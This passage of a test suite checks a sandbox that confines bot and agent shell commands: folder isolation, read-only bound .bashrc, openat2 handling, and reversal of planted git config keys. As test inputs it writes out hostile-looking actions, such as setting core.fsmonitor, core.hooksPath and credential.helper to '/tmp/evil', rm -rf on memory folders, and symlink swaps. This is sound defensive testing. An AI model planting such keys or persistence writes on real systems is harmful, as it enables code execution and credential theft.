    expect(ok(await w.run(`rm -rf '${b("luna", "memory")}'`, owner))).toBe(false);
    expect(existsSync(b("luna", "memory"))).toBe(true);
    writeFileSync(b("luna", "memory", "MEMORY.md"), "luna'smore\n");
    expect(ok(await w.run(`mkdir -p '${b("future", "memory")}' && echo seed > '${b("future", "memory", "MEMORY.md")}'`, owner))).toBe(false);
    expect(existsSync(b("future"))).toBe(false);
    // A side thread reads and writes the same memory.
    expect(ok(await w.run(`echo side >> '${b("luna", "memory", "MEMORY.md")}'`, { caller: { kind: "session", sessionId: "t1", sessionKind: "side-thread", bot: "luna" } }))).toBe(true);
    // Everyone else: the user's coding session, the bot's own agent, another bot.
    for (const who of [{ caller: session("c1") }, { caller: agent("luna") }, { caller: botCaller("sol", "s9") }]) {
      expect(ok(await w.run(`cat '${b("luna", "memory", "MEMORY.md")}'`, who))).toBe(false);
      expect(ok(await w.run(`echo x >> '${b("luna", "memory", "MEMORY.md")}'`, who))).toBe(false);
    }
    expect(readFileSync(b("luna", "memory", "MEMORY.md"), "utf8")).toBe("luna'smore\nside\n");
  }, 90_000);

  test("a read-only bound login file cannot be renamed away (EBUSY), and openat2 is performed", async () => {
    if (here !== "linux" || process.arch !== "x64") return; // the Linux supervisor's answers
    const w = world();
    const own = { caller: botCaller("luna", "s1") };
    // The setup pre-creates .bashrc empty and binds it read-only. A performed rename must report EBUSY —
    // the kernel's own answer for a mountpoint — rather than moving the real file or answering EACCES.
    const bashrc = join(w.home, ".bashrc"), moved = join(w.home, "moved-bashrc");
    const r = await w.run(`mv '${bashrc}' '${moved}'`, own);
    expect(r.kind === "exited" && r.code !== 0).toBe(true);
    expect(r.kind === "exited" && r.stderr).toMatch(/busy/i);
    expect(existsSync(bashrc)).toBe(true);
    expect(existsSync(moved)).toBe(false);
    // openat2 (SYS 437 on x64) is never continued: its flags live in the target's memory, so every openat2
    // is performed. Creates, reads and plant refusals all work through it.
    if (!ok(await w.run(`command -v python3`, own))) return; // no python in the sandbox: skip
    const o2 = (script: string) => `python3 - <<'PYEOF'\nimport ctypes, os\nlibc = ctypes.CDLL("libc.so.6", use_errno=True)\nclass How(ctypes.Structure):\n    _fields_ = [("flags", ctypes.c_uint64), ("mode", ctypes.c_uint64), ("resolve", ctypes.c_uint64)]\ndef o2(path, flags, mode=0o644):\n    how = How(flags=flags, mode=mode, resolve=0)\n    fd = libc.syscall(437, -100, os.fsencode(path), ctypes.byref(how), ctypes.sizeof(how))\n    if fd < 0:\n        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))\n    return fd\n${script}\nPYEOF`;
    const created = join(w.home, "project", "o2.txt");
    expect(ok(await w.run(o2(`fd = o2("${created}", os.O_WRONLY | os.O_CREAT | os.O_TRUNC)\nos.write(fd, b"via-openat2\\n")\nos.close(fd)`), own))).toBe(true);
    expect(readFileSync(created, "utf8")).toBe("via-openat2\n");
    // A read through openat2 works the same way (performed, not continued).
    const rd = await w.run(o2(`fd = o2("${created}", os.O_RDONLY)\nprint(os.read(fd, 100).decode(), end="")`), own);
    expect(rd.kind === "exited" && rd.code === 0 && rd.stdout).toBe("via-openat2\n");
    // And a plant through openat2 is refused, like any other write.
    expect(ok(await w.run(o2(`o2("${bashrc}", os.O_WRONLY | os.O_CREAT)`), own))).toBe(false);
    expect(readFileSync(bashrc, "utf8")).toBe("");
  }, 90_000);

  test("a write-open without O_CREAT on a missing path is ENOENT and creates nothing; so is a read-only openat2", async () => {
    if (here !== "linux" || process.arch !== "x64") return; // the Linux supervisor's answers
    const w = world();
    const own = { caller: botCaller("luna", "s1") };
    if (!ok(await w.run(`command -v python3`, own))) return; // no python in the sandbox: skip
    const missing = join(w.home, "project", "never-there.txt");
    // open and openat without O_CREAT (plain os.open: O_WRONLY, O_RDWR): the kernel's own ENOENT, no file.
    for (const flags of ["os.O_WRONLY", "os.O_RDWR"]) {
      const r = await w.run(`python3 -c 'import os; os.open("${missing}", ${flags})'`, own);
      expect(r.kind === "exited" && r.code !== 0).toBe(true);
      expect(r.kind === "exited" && r.stderr).toMatch(/No such file|ENOENT/i);
    }
    // A read-only openat2 on a missing path: ENOENT too, never a mode-000 create.
    const o2miss = await w.run(`python3 - <<'PYEOF'\nimport ctypes, os\nlibc = ctypes.CDLL("libc.so.6", use_errno=True)\nclass How(ctypes.Structure):\n    _fields_ = [("flags", ctypes.c_uint64), ("mode", ctypes.c_uint64), ("resolve", ctypes.c_uint64)]\nhow = How(flags=os.O_RDONLY, mode=0, resolve=0)\nfd = libc.syscall(437, -100, os.fsencode("${missing}"), ctypes.byref(how), ctypes.sizeof(how))\nraise SystemExit(0 if fd >= 0 else 2)\nPYEOF`, own);
    expect(o2miss.kind === "exited" && o2miss.code).toBe(2);
    expect(existsSync(missing)).toBe(false);
    // And a scoped openat2 (RESOLVE_BENEATH) on an existing file is refused outright, not silently unscoped.
    const real = join(w.home, "project", "real.txt");
    writeFileSync(real, "hi\n");
    const o2scoped = await w.run(`python3 - <<'PYEOF'\nimport ctypes, os\nlibc = ctypes.CDLL("libc.so.6", use_errno=True)\nclass How(ctypes.Structure):\n    _fields_ = [("flags", ctypes.c_uint64), ("mode", ctypes.c_uint64), ("resolve", ctypes.c_uint64)]\nhow = How(flags=os.O_RDONLY, mode=0, resolve=0x08)\nfd = libc.syscall(437, -100, os.fsencode("${real}"), ctypes.byref(how), ctypes.sizeof(how))\nraise SystemExit(0 if fd >= 0 else 2)\nPYEOF`, own);
    expect(o2scoped.kind === "exited" && o2scoped.code).toBe(2);
  }, 90_000);

  test("a risky key set between two runs is caught at the next run's start, never taken as its baseline (#321's check 2)", async () => {
    const w = world();
    const own = { caller: botCaller("luna", "s-between") };
    expect(ok(await w.run(`git init -q repo`, own))).toBe(true);
    const config = join(w.home, "project", "repo", ".git", "config");
    // Something outside the runs (stood for by a write from here) sets a risky key and an ordinary one.
    writeFileSync(config, `${readFileSync(config, "utf8")}[core]\n\tfsmonitor = /tmp/evil\n[user]\n\temail = x@y.io\n`);
    const next = await w.run(`true`, own);
    expect(next.kind === "exited" && next.stderr).toMatch(/core\.fsmonitor/);
    expect(readFileSync(config, "utf8")).not.toContain("fsmonitor");
    expect(readFileSync(config, "utf8")).toContain("x@y.io");
    // Another session's runs never look at this one's.
    writeFileSync(config, `${readFileSync(config, "utf8")}[core]\n\tfsmonitor = /tmp/evil2\n`);
    const other = await w.run(`true`, { caller: botCaller("luna", "s-other") });
    expect(other.kind === "exited" && other.stderr).not.toMatch(/fsmonitor/);
    expect(w.spawner.recheck!("s-between")).toMatch(/core\.fsmonitor/);
  }, 60_000);

  test("git config guard: a risky key set through git config or a direct edit is reverted", async () => {
    const w = world();
    const own = { caller: botCaller("luna", "s1") };
    // A repo the command works in, and a global config.
    expect(ok(await w.run(`git init -q repo && cd repo && git config user.email t@e && git config user.name t`, own))).toBe(true);
    writeFileSync(join(w.home, ".gitconfig"), "[user]\n\tname = Luna\n");
    // Through git config: the command sees its own write, but afterwards the key is reverted and reported.
    const planted = await w.run(`cd repo && git config core.hooksPath /tmp/evil && git config user.email evil@x.io && git config --get core.hooksPath`, own);
    expect(planted.kind === "exited" && planted.stdout).toBe("/tmp/evil\n");
    expect(planted.kind === "exited" && planted.stderr).toMatch(/core\.hookspath/);
    expect(readFileSync(join(w.home, "project", "repo", ".git", "config"), "utf8")).not.toContain("hooksPath");
    expect(readFileSync(join(w.home, "project", "repo", ".git", "config"), "utf8")).toContain("evil@x.io");
    expect(ok(await w.run(`cd repo && git config --get core.hooksPath || echo GONE`, own))).toBe(true);
    // A direct file edit: reverted the same way.
    const edited = await w.run(`printf '[core]\\n\\tfsmonitor = /tmp/evil\\n' >> repo/.git/config && git -C repo config --get core.fsmonitor`, own);
    expect(edited.kind === "exited" && edited.stdout).toBe("/tmp/evil\n");
    expect(readFileSync(join(w.home, "project", "repo", ".git", "config"), "utf8")).not.toContain("fsmonitor");
    // The global config is guarded too.
    const gold = join(w.home, ".git-global-test");
    writeFileSync(gold, "[user]\n\tname = Luna\n[core]\n\tpager = less\n");
    const gb = new Map([[gold, readFileSync(gold, "utf8")]]);
    writeFileSync(gold, "[user]\n\tname = Luna\n[core]\n\tpager = less\n[credential]\n\thelper = /tmp/evil\n");
    const gnote = revertPlantedGitKeys(gb);
    expect(gnote).toMatch(/credential\.helper/);
    expect(gnote).not.toMatch(/pager/);
    expect(readFileSync(gold, "utf8")).toContain("core");
    expect(readFileSync(gold, "utf8")).not.toContain("helper");
    // An unwatched change alone is left in place.
    writeFileSync(gold, "[user]\n\tname = Sol\n");
    expect(revertPlantedGitKeys(new Map([[gold, "[user]\n\tname = Luna\n"]]))).toBeNull();
    expect(readFileSync(gold, "utf8")).toBe("[user]\n\tname = Sol\n");
  }, 90_000);

  test("bots' folders for runners: its own bot's whole folder reads, every other runner sees none; transcripts hidden", async () => {
    const w = world();
    const b = (...p: string[]) => join(w.clover, "bots", ...p);
    const store = (...p: string[]) => join(w.clover, "sdk", "projects", ...p);
    for (const d of [b("luna", "memory"), b("luna", "agents"), b("sol", "memory"), join(w.clover, "sdk", "projects", "key")]) mkdirSync(d, { recursive: true });
    writeFileSync(b("luna", "memory", "MEMORY.md"), "luna's");
    writeFileSync(b("luna", "agents", "t.json"), "{}");
    writeFileSync(b("sol", "memory", "MEMORY.md"), "sol's");
    writeFileSync(store("key", "s.jsonl"), "{}");
    const owner = { caller: botCaller("luna", "s1") };
    expect(ok(await w.run(`cat '${b("luna", "agents", "t.json")}' && cat '${b("luna", "memory", "MEMORY.md")}' && cat '${b("luna", "memory", "MEMORY.md")}'`, owner))).toBe(true);
    expect(ok(await w.run(`ls '${b("luna")}'`, owner))).toBe(true);
    expect(ok(await w.run(`cat '${b("sol", "memory", "MEMORY.md")}'`, owner))).toBe(false);
    expect(ok(await w.run(`cat '${store("key", "s.jsonl")}'`, owner))).toBe(false);
    expect(ok(await w.run(`echo x > '${store("key", "s2.jsonl")}'`, owner))).toBe(false);
    if (here === "linux") {
      // The tmpfs view holds only its own folder (the folder name is there, nothing of any other bot).
      expect(ok(await w.run(`test "$(ls -A '${b()}')" = luna`, owner))).toBe(true);
      // Its own outputs, scratch and routines read and write there too (made for it on first run).
      for (const d of [join(w.clover, "outputs", "s1"), join(w.clover, "scratch", "luna")]) mkdirSync(d, { recursive: true });
      expect(ok(await w.run(`echo o > '${join(w.clover, "outputs", "s1", "r.md")}' && echo s > '${join(w.clover, "scratch", "luna", "n.md")}' && echo r > '${join(w.clover, "routines", "luna", "m.md")}'`, owner))).toBe(true);
      // Its plugin-data doesn't open for it; another plugin's neither opens for anyone else.
      expect(ok(await w.run(`echo x > '${join(w.clover, "plugin-data", "tarot", "d.json")}'`, { caller: { kind: "plugin", pluginId: "tarot" } }))).toBe(true);
    } else {
      expect(ok(await w.run(`ls '${b()}'`, owner))).toBe(false); // a listing would name every bot: denied outright
    }
    // Everyone else, its own agent and a coding session included: no bot folder, and the store still hidden.
    for (const who of [{ caller: session("c1") }, { caller: agent("luna") }]) {
      expect(ok(await w.run(`cat '${b("luna", "agents", "t.json")}'`, who))).toBe(false);
      expect(ok(await w.run(`cat '${b("luna", "memory", "MEMORY.md")}'`, who))).toBe(false);
      expect(ok(await w.run(`cat '${b("sol", "memory", "MEMORY.md")}'`, who))).toBe(false);
      if (here === "linux") expect(ok(await w.run(`test -z "$(ls -A '${b()}')"`, who))).toBe(true);
      else expect(ok(await w.run(`ls '${b()}'`, who))).toBe(false);
      expect(ok(await w.run(`cat '${store("key", "s.jsonl")}'`, who))).toBe(false);
    }
  }, 90_000);

  test("ordinary work runs: a shell pipeline, git init and commit in the project, mktemp", async () => {
    const w = world();
    const r = await w.run(`printf 'a\nb\n' | sort -r | head -1 && git init -q . && git -c user.email=t@e -c user.name=t commit -q --allow-empty -m x && git log --oneline | wc -l | tr -d ' ' && TMPDIR='${w.temp}' mktemp >/dev/null && echo done`);
    expect(r).toMatchObject({ kind: "exited", code: 0, shell: "sh" });
    expect(r.kind === "exited" && r.stdout).toBe("b\n1\ndone\n");
  }, 60_000);

  test("git init and clone work without installing hooks", async () => {
    const w = world();
    // Plain init and clone, as a bot runs them: Clover's empty template installs no hooks.
    expect(ok(await w.run(`git init -q . && test ! -e .git/hooks && git -c user.email=t@e -c user.name=t commit -q --allow-empty -m x`))).toBe(true);
    expect(existsSync(join(w.home, "project", ".git", "hooks"))).toBe(false);
    mkdirSync(join(w.home, "clone")); // the held home takes no new top-level names: the target exists first
    expect(ok(await w.run(`git clone -q . ../clone && test ! -e ../clone/.git/hooks && cd ../clone && git -c user.email=t@e -c user.name=t commit -q --allow-empty -m y && git log --oneline | wc -l`))).toBe(true);
    expect(existsSync(join(w.home, "clone", ".git", "hooks"))).toBe(false);
  }, 60_000);
});

const session = (sessionId: string): Caller => ({ kind: "session", sessionId, sessionKind: "coding" });
const agent = (bot: string): Caller => ({ kind: "session", sessionId: "a1", sessionKind: "agent", bot });

// Linux: the same holds under bubblewrap, run for real (the VM gate; skipped elsewhere and where bwrap can't run).
(process.platform === "linux" ? describe : describe.skip)("bubblewrap, live (#392's review)", () => {
  const coding = { kind: "session" as const, sessionId: "c1", sessionKind: "coding" as const };
  const runIn = (home: string) => {
    for (const d of ["project", "tmp", ".clover"]) mkdirSync(join(home, d), { recursive: true });
    const spawner = fencedSpawner({ fence: new CloverFence({ os: "linux", home, cloverHome: join(home, ".clover"), temp: join(home, "tmp") }) });
    return { spawner, run: (command: string) => spawner.run({ command, cwd: join(home, "project"), env: { PATH: "/usr/bin:/bin", HOME: home }, timeoutMs: 30_000, who: { caller: coding } }) };
  };
  const out = (r: Awaited<ReturnType<ReturnType<typeof runIn>["run"]>>) => (r.kind === "exited" ? r.stdout : r.kind === "refused" ? `refused: ${r.reason}` : "timeout");

  test("each folder between the home and a deep held link (~/a/b/c/gitconfig) can't be renamed, nor the link swapped", async () => {
    const home = realpathSync(mkdtempSync(join(tmpdir(), "lane-c-bwrap-deep-")));
    const at = (...p: string[]) => join(home, ...p);
    for (const d of [at("a", "b", "c"), at("real")]) mkdirSync(d, { recursive: true });
    writeFileSync(at("real", "deep"), "[user]\n\tname = me\n");
    symlinkSync(at("real", "deep"), at("a", "b", "c", "gitconfig"));
    symlinkSync(at("a", "b", "c", "gitconfig"), at(".gitconfig"));
    const { spawner, run } = runIn(home);
    if (!spawner.available) return;
    for (const f of [at("a"), at("a", "b"), at("a", "b", "c")]) {
      expect([f, out(await run(`mv '${f}' '${f}.away' && echo moved`))]).toEqual([f, ""]);
      expect(existsSync(`${f}.away`)).toBe(false);
    }
    expect(out(await run(`rm -f '${at("a", "b", "c", "gitconfig")}' && ln -s '${at("project")}' '${at("a", "b", "c", "gitconfig")}' && echo swapped`))).toBe("");
    expect(readlinkSync(at("a", "b", "c", "gitconfig"))).toBe(at("real", "deep"));
    expect(out(await run(`printf x > '${at("a", "b", "notes.md")}' && echo wrote`))).toBe("wrote\n");
  }, 120_000);

  test("a fresh home: a first `mkdir -p ~/.config/gh` works, and ~/.config can't be renamed", async () => {
    const home = realpathSync(mkdtempSync(join(tmpdir(), "lane-c-bwrap-fresh-")));
    const { spawner, run } = runIn(home);
    if (!spawner.available) return;
    expect(out(await run('mkdir -p "$HOME/.config/gh" && echo made'))).toBe("made\n");
    expect(existsSync(join(home, ".config", "gh"))).toBe(true);
    expect(out(await run('mv "$HOME/.config" "$HOME/.config.away" && echo moved'))).toBe("");
    expect(existsSync(join(home, ".config.away"))).toBe(false);
  }, 120_000);
});
